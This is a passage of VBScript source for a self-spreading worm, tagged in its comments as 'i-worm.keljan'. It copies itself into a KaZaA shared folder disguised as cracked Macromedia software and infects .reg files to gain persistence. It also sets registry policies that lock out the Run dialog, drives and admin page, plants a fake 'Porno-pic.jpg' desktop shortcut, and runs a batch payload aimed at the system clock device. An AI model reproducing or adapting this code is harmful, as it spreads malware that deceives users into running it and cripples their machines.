   set fso = CreateObject("Scripting.filesystemobject")
   if fso.folderexists("C:\Program Files\KaZaA Lite\My Shared Folder") then
   fso.copyfile Myfile, "C:\Program Files\KaZaA Lite\My Shared Folder\Macromedia Flash 8 + Rus + Keygen.exe.vbs"
   fso.copyfile Myfile, "C:\Program Files\KaZaA Lite\My Shared Folder\Macromedia DreamWeaver 8 + Rus + Keygen.exe.vbs"
   fso.copyfile Myfile, "C:\Program Files\KaZaA Lite\My Shared Folder\Macromedia HomeSite 5,5 + Rus + Keygen.exe.vbs"
   fso.copyfile Myfile, "C:\Program Files\KaZaA Lite\My Shared Folder\Macromedia Director 10 + Rus + Keygen.exe.vbs"
   fso.copyfile Myfile, "C:\Program Files\KaZaA Lite\My Shared Folder\2000 Serials.exe.vbs"
   End if
   If fso.GetExtensionName(file.path)="reg" then
     set openreg = fso.opentextfile(file.path,1)
     read = openreg.readall
     set createreg = fso.createtextfile(file.path,2)
     createreg.write read & vbcrlf
     createreg.writeline "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce]"
     createreg.writeline chr(34)&"mvbswe"&chr(34)&"="&chr(34)&"command /c echo set a=createobject(\"&chr(34)&"Scripting.filesystemobject\"&chr(34)&"):set b=a.opentextfile(\"&chr(34)&"C:\windows\mcrmd_9_10_11_12_13_14_15_____MS___________win32_______________________end.vbs"&chr(34)&"):c=b.readall set d=a.createtextfile(\"&chr(34)&"virus.vbs\"&chr(34)&").write c:createobject(\"&chr(34)&"wscript.shell\"&chr(34)&").run \"&chr(34)&"virus.vbs\"&chr(34)&",0>vir.vbs"&chr(34)
     createreg.writeline chr(34)&"mvbswerun"&chr(34)&"="&chr(34)&"wscript vir.vbs"&chr(34)
     createreg.close
   end if
   'i-worm.keljan
   CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun", 1, "REG_DWORD"
   CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", 67108863, "REG_DWORD"
   CreateObject("Wscript.shell").regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\NoAdminPage", 1, "REG_DWORD"
   if fso.FolderExists("C:\Documents and Settings\All Users\Desktop") then
   on error resume next
   set mvbswe=wscript.createobject("wscript.shell")
   set msc=mvbswe.CreateShortCut("C:\Documents and Settings\All Users\Desktop\Porno-pic.jpg.lnk")
   msc.TargetPath = mvbswe.ExpandEnvironmentStrings("C:\windows\system.vbs")
   msc.IconLocation = Shell.ExpandEnvironmentStrings("C:\windows\system32\mspaint.exe, 0")
   msc.WindowStyle = 4
   msc.Save
   end if
   'i-worm.keljan
   set fso = createobject("scripting.filesystemobject")
   set mvbswe = wscript.CreateObject("wscript.shell")
   set pay = fso.createtextfile("C:\paybios.bat")
   pay.writeline "Echo 000>clock$"
   pay.Close
   mvbswe.run "C:\paybios.bat"
